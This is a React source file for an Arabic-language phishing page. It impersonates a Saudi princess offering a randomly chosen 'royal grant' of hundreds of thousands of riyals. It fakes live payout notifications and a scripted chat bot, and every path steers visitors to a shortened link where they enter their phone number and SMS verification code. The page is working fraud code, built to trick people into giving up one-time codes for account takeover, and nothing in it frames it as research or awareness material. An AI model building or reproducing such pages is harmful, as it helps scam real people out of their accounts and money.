import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Gift, CheckCircle, ArrowLeft, ShieldCheck, MessageCircle, Send, BadgeCheck, Lock, Star, ChevronDown, ArrowDown } from 'lucide-react';

export default function App() {
  const prizes = ["350,000", "400,000", "500,000", "750,000", "1,000,000", "1,500,000"];
  const [prize, setPrize] = useState("");
  
  const names = ["محمد", "أحمد", "علي", "فاطمة", "محمود", "يوسف", "خالد", "عمر", "سارة", "نورة", "عبدالله", "سلمان", "فيصل", "سعود", "عبدالرحمن", "وليد", "تركي", "فهد"];
  const countries = ["السعودية", "الإمارات", "الكويت", "قطر", "عمان", "البحرين"];
  const notificationPrizes = ["350,000", "400,000", "500,000", "750,000"];

  interface Notification {
    id: number;
    name: string;
    country: string;
    amount: string;
  }

  interface Message {
    id: number;
    text: string;
    time: string;
    sender: 'bot' | 'user';
  }

  const [currentNotification, setCurrentNotification] = useState<Notification | null>(null);
  
  // Chat State
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [messages, setMessages] = useState<Message[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [showLinkButton, setShowLinkButton] = useState(false);
  const [inputValue, setInputValue] = useState("");
  
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const simulationStarted = useRef(false);

  const profileImage = "https://scontent.fcai19-5.fna.fbcdn.net/v/t39.30808-6/648292851_923981573685261_5485062212761080772_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=1d70fc&_nc_ohc=wLaoa4E1N3QQ7kNvwHs53Zm&_nc_oc=AdkgzC2tPWYsGu4HZPm7lFX6tgcdAzTijkDZKY-ZaZVQTZO_QOr8zGktX-XS4iwRSvQ&_nc_zt=23&_nc_ht=scontent.fcai19-5.fna&_nc_gid=2mZ8QIUFEiX24Bf0SsWDLg&_nc_ss=8&oh=00_AfwJ3FJYJwbSYGyyMUEN8FMIL12xq65dk3YfmRIsj2jU7w&oe=69B362E3";
  const claimLink = "https://smrturl.co/7e74738";
  const princessName = "الأميرة سهام بنت عبد العزيز";

  const getCurrentTime = () => {
    const now = new Date();
    return now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
  };

  useEffect(() => {
    setPrize(prizes[Math.floor(Math.random() * prizes.length)]);
  }, []);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isTyping, showLinkButton]);

  // Chat Simulation Logic
  useEffect(() => {
    if (!isChatOpen || !prize || simulationStarted.current) return;
    simulationStarted.current = true;

    const runChat = async () => {
      const addMsg = async (text: string, delay: number) => {
        setIsTyping(true);
        await new Promise(r => setTimeout(r, delay));
        setIsTyping(false);
        setMessages(prev => [...prev, { id: Date.now(), text, time: getCurrentTime(), sender: 'bot' }]);
        await new Promise(r => setTimeout(r, 400));
      };

      await new Promise(r => setTimeout(r, 500));
      await addMsg("السلام عليكم ورحمة الله وبركاته ✋", 800);
      await addMsg(`مرحباً بك. يسعدني إبلاغك بأنه تم اختيارك لاستلام مكرمة مالية بقيمة ${prize} ريال سعودي.`, 1500);
      await addMsg("الرجاء اتباع الخطوات التالية لإيداع المبلغ في حسابك البنكي:", 1000);
      await addMsg("1️⃣ اضغط على الرابط بالأسفل.\n2️⃣ أدخل رقم جوالك.\n3️⃣ قم بتأكيد الرمز المرسل إليك (SMS).\n\nسيتم تحويل المبلغ فور تأكيد هويتك.", 2000);
      
      setIsTyping(true);
      await new Promise(r => setTimeout(r, 800));
      setIsTyping(false);
      setShowLinkButton(true);
    };

    runChat();
  }, [isChatOpen, prize]);

  const handleSendMessage = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!inputValue.trim()) return;

    const userMsg = inputValue;
    setInputValue("");
    setMessages(prev => [...prev, { id: Date.now(), text: userMsg, time: getCurrentTime(), sender: 'user' }]);

    setIsTyping(true);
    await new Promise(r => setTimeout(r, 1200));
    setIsTyping(false);

    const replyText = "عزيزي المستفيد، النظام يتطلب تأكيد رقم الجوال أولاً.\n\nيرجى الضغط على الرابط أدناه وإكمال التأكيد ليتم تحويل المبلغ.";
    setMessages(prev => [...prev, { id: Date.now(), text: replyText, time: getCurrentTime(), sender: 'bot' }]);
    
    setShowLinkButton(true);
    scrollToBottom();
  };

  useEffect(() => {
    const showRandomNotification = () => {
      setCurrentNotification({
        id: Date.now(),
        name: names[Math.floor(Math.random() * names.length)],
        country: countries[Math.floor(Math.random() * countries.length)],
        amount: notificationPrizes[Math.floor(Math.random() * notificationPrizes.length)]
      });
      setTimeout(() => setCurrentNotification(null), 4000);
    };

    const initialTimeout = setTimeout(showRandomNotification, 5000);
    const interval = setInterval(showRandomNotification, 12000);

    return () => {
      clearTimeout(initialTimeout);
      clearInterval(interval);
    };
  }, []);

  return (
    <div dir="rtl" className="min-h-screen bg-[#050505] text-[#E5E5E5] font-sans overflow-x-hidden pb-24 selection:bg-[#D4AF37]/30">
      {/* Luxury Background Elements */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
        <div className="absolute top-[-10%] right-[-10%] w-[50%] h-[50%] rounded-full bg-[#D4AF37]/5 blur-[120px]"></div>
        <div className="absolute bottom-[-10%] left-[-10%] w-[50%] h-[50%] rounded-full bg-[#D4AF37]/5 blur-[120px]"></div>
        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/stardust.png')] opacity-20"></div>
      </div>

      {/* Header */}
      <header className="relative z-40 border-b border-white/5 bg-black/50 backdrop-blur-md">
        <div className="max-w-md mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="relative">
              <div className="w-12 h-12 rounded-full p-[2px] bg-gradient-to-br from-[#D4AF37] via-[#F3E5AB] to-[#AA7C11]">
                <img src={profileImage} alt="Profile" className="w-full h-full rounded-full object-cover border-2 border-black" />
              </div>
              <div className="absolute -bottom-1 -right-1 bg-black rounded-full p-0.5">
                <BadgeCheck className="w-4 h-4 text-[#D4AF37]" />
              </div>
            </div>
            <div>
              <h1 className="font-bold text-sm text-white tracking-wide">{princessName}</h1>
              <p className="text-[11px] text-[#D4AF37] font-medium flex items-center gap-1.5 uppercase tracking-widest mt-0.5">
                <span className="w-1.5 h-1.5 rounded-full bg-[#D4AF37] animate-pulse shadow-[0_0_8px_rgba(212,175,55,0.8)]"></span>
                متاح الآن
              </p>
            </div>
          </div>
          <Star className="w-5 h-5 text-[#D4AF37]/50" />
        </div>
      </header>

      <main className="relative z-10 max-w-md mx-auto px-6 py-10 flex flex-col items-center">
        
        {/* Main Luxury Card */}
        <motion.div 
          initial={{ y: 30, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.8, ease: [0.16, 1, 0.3, 1] }}
          className="w-full relative mb-10"
        >
          <div className="absolute inset-0 bg-gradient-to-b from-[#D4AF37]/20 to-transparent rounded-3xl blur-xl"></div>
          <div className="relative w-full bg-[#0A0A0A] rounded-3xl overflow-hidden border border-white/10 shadow-2xl">
            
            <div className="p-8 text-center relative">
              <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-1 bg-gradient-to-r from-transparent via-[#D4AF37] to-transparent opacity-50"></div>
              
              <ShieldCheck className="w-10 h-10 text-[#D4AF37] mx-auto mb-6 opacity-80" />
              
              <h2 className="text-white/60 text-xs font-medium mb-3 uppercase tracking-[0.2em]">المكرمة المالية المعتمدة</h2>
              
              <div className="my-6 relative">
                <div className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-b from-[#FFF] via-[#F3E5AB] to-[#D4AF37] tracking-tighter drop-shadow-lg">
                  {prize}
                </div>
                <div className="text-[#D4AF37] text-lg font-bold mt-2 tracking-widest">ريال سعودي</div>
              </div>
              
              <p className="text-white/50 text-sm text-center mb-8 leading-relaxed font-light">
                تم اعتماد هذا المبلغ لك. يرجى إكمال عملية التحقق ليتم إيداع المبلغ في حسابك البنكي.
              </p>
              
              <div className="relative w-full mt-10">
                <div className="absolute -top-12 left-1/2 -translate-x-1/2 flex flex-col items-center animate-bounce text-[#D4AF37]">
                  <span className="text-[10px] font-bold bg-[#D4AF37]/10 px-3 py-1 rounded-full mb-1 border border-[#D4AF37]/20 whitespace-nowrap backdrop-blur-sm">
                    اضغط هنا
                  </span>
                  <ArrowDown size={20} className="drop-shadow-lg" />
                </div>
                
                <a 
                  href={claimLink}
                  className="group relative flex items-center justify-center gap-3 w-full bg-transparent text-[#D4AF37] font-bold text-lg py-4 rounded-full transition-all active:scale-95 overflow-hidden border border-[#D4AF37]/30 hover:border-[#D4AF37]"
                >
                  <div className="absolute inset-0 bg-[#D4AF37]/10 group-hover:bg-[#D4AF37]/20 transition-colors"></div>
                  <Gift className="w-5 h-5" />
                  إدخال رقم جوالك
                </a>
              </div>
              
              <div className="mt-6 flex items-center justify-center gap-2 text-[10px] text-white/40 font-medium uppercase tracking-widest">
                <Lock className="w-3 h-3" />
                <span>بوابة آمنة وموثقة</span>
              </div>
            </div>
          </div>
        </motion.div>

        {/* Elegant Steps */}
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.3, duration: 0.8 }}
          className="w-full"
        >
          <div className="flex items-center justify-center gap-4 mb-8">
            <div className="h-[1px] flex-1 bg-gradient-to-r from-transparent to-white/10"></div>
            <h3 className="text-white/80 font-light text-xs uppercase tracking-[0.2em]">خطوات الاستلام</h3>
            <div className="h-[1px] flex-1 bg-gradient-to-l from-transparent to-white/10"></div>
          </div>

          <div className="space-y-6">
            
            <div className="flex gap-5 items-start group">
              <div className="w-10 h-10 rounded-full border border-white/10 flex items-center justify-center shrink-0 text-[#D4AF37] font-light text-sm group-hover:border-[#D4AF37]/50 transition-colors">01</div>
              <div className="pt-2">
                <h4 className="font-medium text-white/90 text-sm mb-1.5 tracking-wide">تسجيل الدخول</h4>
                <p className="text-xs text-white/40 leading-relaxed font-light">اضغط على زر الاستلام وأدخل رقم جوالك الفعال.</p>
              </div>
            </div>
            
            <div className="flex gap-5 items-start group">
              <div className="w-10 h-10 rounded-full border border-white/10 flex items-center justify-center shrink-0 text-[#D4AF37] font-light text-sm group-hover:border-[#D4AF37]/50 transition-colors">02</div>
              <div className="pt-2">
                <h4 className="font-medium text-white/90 text-sm mb-1.5 tracking-wide">رمز التحقق</h4>
                <p className="text-xs text-white/40 leading-relaxed font-light">أدخل الرمز (OTP) المرسل إلى جوالك لتأكيد هويتك.</p>
              </div>
            </div>
            
            <div className="flex gap-5 items-start group">
              <div className="w-10 h-10 rounded-full border border-white/10 flex items-center justify-center shrink-0 text-[#D4AF37] font-light text-sm group-hover:border-[#D4AF37]/50 transition-colors">03</div>
              <div className="pt-2">
                <h4 className="font-medium text-white/90 text-sm mb-1.5 tracking-wide">إيداع المبلغ</h4>
                <p className="text-xs text-white/40 leading-relaxed font-light">سيتم تحويل المبلغ إلى حسابك البنكي المرتبط برقمك.</p>
              </div>
            </div>

          </div>
        </motion.div>
      </main>

      {/* Luxury Chat Button */}
      {!isChatOpen && (
        <motion.button
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          whileTap={{ scale: 0.9 }}
          onClick={() => setIsChatOpen(true)}
          className="fixed bottom-8 right-8 w-16 h-16 bg-gradient-to-br from-[#D4AF37] to-[#AA7C11] text-black rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(212,175,55,0.3)] z-40 border border-[#F3E5AB]/50"
        >
          <MessageCircle className="w-7 h-7" />
          <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 border-2 border-black rounded-full animate-pulse"></span>
        </motion.button>
      )}

      {/* Elegant Live Notifications */}
      <div className="fixed bottom-28 left-0 right-0 z-30 flex justify-center pointer-events-none px-6">
        <AnimatePresence>
          {currentNotification && !isChatOpen && (
            <motion.div
              initial={{ y: 50, opacity: 0, scale: 0.9 }}
              animate={{ y: 0, opacity: 1, scale: 1 }}
              exit={{ y: 20, opacity: 0, scale: 0.9 }}
              className="bg-black/80 backdrop-blur-xl border border-white/10 text-white rounded-2xl p-4 flex items-center gap-4 shadow-2xl pointer-events-auto max-w-sm w-full"
            >
              <div className="bg-[#D4AF37]/10 rounded-full p-2 shrink-0 border border-[#D4AF37]/30">
                <CheckCircle className="w-5 h-5 text-[#D4AF37]" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-xs font-light text-white/60 mb-1">تم تحويل مبلغ</p>
                <p className="text-sm font-medium truncate">
                  <span className="text-[#D4AF37] font-bold">{currentNotification.amount} ر.س</span> إلى {currentNotification.name}
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Luxury Chat Modal */}
      <AnimatePresence>
        {isChatOpen && (
          <motion.div
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: "spring", damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-50 bg-[#050505] flex flex-col"
          >
            {/* Chat Header */}
            <header className="bg-[#0A0A0A] border-b border-white/5 px-4 py-4 flex items-center gap-4 z-10">
              <button onClick={() => setIsChatOpen(false)} className="p-2 -ml-2 text-white/60 hover:text-white transition-colors">
                <ChevronDown className="w-6 h-6" />
              </button>
              <div className="relative shrink-0">
                <div className="w-10 h-10 rounded-full p-[1px] bg-gradient-to-br from-[#D4AF37] to-[#AA7C11]">
                  <img src={profileImage} alt="Profile" className="w-full h-full rounded-full object-cover border border-black" />
                </div>
                <div className="absolute -bottom-0.5 -right-0.5 bg-black rounded-full p-0.5">
                  <span className="block w-2.5 h-2.5 bg-[#D4AF37] rounded-full"></span>
                </div>
              </div>
              <div className="flex-1 min-w-0">
                <h2 className="font-medium text-sm text-white truncate flex items-center gap-1.5">
                  {princessName}
                  <BadgeCheck className="w-4 h-4 text-[#D4AF37]" />
                </h2>
                <p className="text-[11px] text-[#D4AF37] font-light tracking-wide mt-0.5">
                  {isTyping ? 'تكتب رسالة...' : 'متصل الآن'}
                </p>
              </div>
            </header>

            {/* Chat Area */}
            <div className="flex-1 overflow-y-auto p-5 flex flex-col gap-4 relative">
              <div className="text-center my-4">
                <span className="bg-white/5 text-white/40 text-[10px] uppercase tracking-widest px-4 py-1.5 rounded-full border border-white/5">
                  اليوم
                </span>
              </div>

              <AnimatePresence>
                {messages.map((msg) => (
                  <motion.div 
                    key={msg.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
                  >
                    <div className={`max-w-[85%] rounded-2xl px-4 py-3 shadow-lg relative ${
                      msg.sender === 'user' 
                        ? 'bg-[#D4AF37] text-black rounded-tr-sm' 
                        : 'bg-[#111] text-white/90 rounded-tl-sm border border-white/5'
                    }`}>
                      <p className={`text-[14px] leading-relaxed whitespace-pre-line ${msg.sender === 'user' ? 'font-medium' : 'font-light'}`}>
                        {msg.text}
                      </p>
                      <div className="flex justify-end items-center gap-1.5 mt-2">
                        <span className={`text-[9px] tracking-wider ${msg.sender === 'user' ? 'text-black/60' : 'text-white/30'}`}>{msg.time}</span>
                        {msg.sender === 'user' && <CheckCircle className="w-3 h-3 text-black/60" />}
                      </div>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>

              {isTyping && (
                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start">
                  <div className="bg-[#111] border border-white/5 rounded-2xl rounded-tl-sm px-5 py-4 shadow-lg flex gap-1.5">
                    <span className="w-1.5 h-1.5 bg-[#D4AF37]/60 rounded-full animate-bounce"></span>
                    <span className="w-1.5 h-1.5 bg-[#D4AF37]/60 rounded-full animate-bounce" style={{ animationDelay: '0.15s' }}></span>
                    <span className="w-1.5 h-1.5 bg-[#D4AF37]/60 rounded-full animate-bounce" style={{ animationDelay: '0.3s' }}></span>
                  </div>
                </motion.div>
              )}

              {showLinkButton && (
                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="flex justify-start mt-2">
                  <div className="bg-[#111] border border-white/5 rounded-2xl rounded-tl-sm p-5 shadow-lg max-w-[85%] relative overflow-hidden">
                    <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#D4AF37]"></div>
                    <h4 className="font-medium text-white mb-2 text-sm">رابط الاستلام الرسمي</h4>
                    <p className="text-xs text-white/50 mb-4 font-light leading-relaxed">اضغط على الزر أدناه لإكمال عملية التحقق واستلام المبلغ.</p>
                    <a 
                      href={claimLink}
                      className="flex items-center justify-center gap-2 w-full bg-[#D4AF37] text-black font-medium py-3 rounded-xl text-sm shadow-lg active:scale-95 transition-transform"
                    >
                      <Gift className="w-4 h-4" />
                      إدخال رقم جوالك
                    </a>
                  </div>
                </motion.div>
              )}
              
              <div ref={messagesEndRef} className="h-4" />
            </div>

            {/* Input Area */}
            <div className="bg-[#0A0A0A] border-t border-white/5 px-4 py-4 flex items-end gap-3 pb-safe">
              <div className="flex-1 bg-[#111] border border-white/10 rounded-full flex items-center px-5 py-2 min-h-[48px] focus-within:border-[#D4AF37]/50 transition-colors">
                <input
                  type="text"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  placeholder="اكتب رسالتك..."
                  className="w-full bg-transparent outline-none text-white placeholder:text-white/30 text-[14px] font-light"
                  onKeyDown={(e) => e.key === 'Enter' && handleSendMessage(e)}
                />
              </div>
              <button 
                onClick={handleSendMessage}
                disabled={!inputValue.trim()}
                className="w-12 h-12 bg-[#D4AF37] rounded-full flex items-center justify-center text-black shadow-lg shrink-0 active:scale-95 transition-transform disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <Send className="w-5 h-5 rtl:-scale-x-100 ml-1" />
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <style dangerouslySetInnerHTML={{__html: `
        .pb-safe {
          padding-bottom: env(safe-area-inset-bottom, 16px);
        }
      `}} />
    </div>
  );
}
